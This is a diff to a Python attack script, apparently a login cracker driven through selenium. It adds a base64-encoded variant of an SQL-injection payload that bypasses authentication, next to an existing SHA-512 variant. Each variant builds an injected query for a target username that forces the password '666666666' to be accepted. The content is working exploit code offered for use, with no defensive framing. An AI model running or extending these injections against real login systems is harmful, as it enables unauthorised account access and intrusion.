@@ -15,6 +15,7 @@ import re
 import requests
 import argparse
 import hashlib
+import base64
 
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
@@ -126,7 +127,12 @@ def crack():
                         
                         injection_columns_sha512 = ("'%s'" % hashlib.sha512(b'666666666').hexdigest()) if not n else injection_columns_sha512 + (",'%s'" % hashlib.sha512(b'666666666').hexdigest())
                         injection = bypass_injection % (username, injection_columns_sha512)                        
-                        inject(injection, "666666666", f)                         
+                        inject(injection, "666666666", f)
+
+                        # i found one of this some years ago
+                        injection_columns_base64 = ("'%s'" % base64.b64encode(b'666666666')) if not n else injection_columns_base64 + (",'%s'" % base64.b64encode(b'666666666'))
+                        injection = bypass_injection % (username, injection_columns_base64)                        
+                        inject(injection, "666666666", f)
 
 
 def inject(injection, password, f):
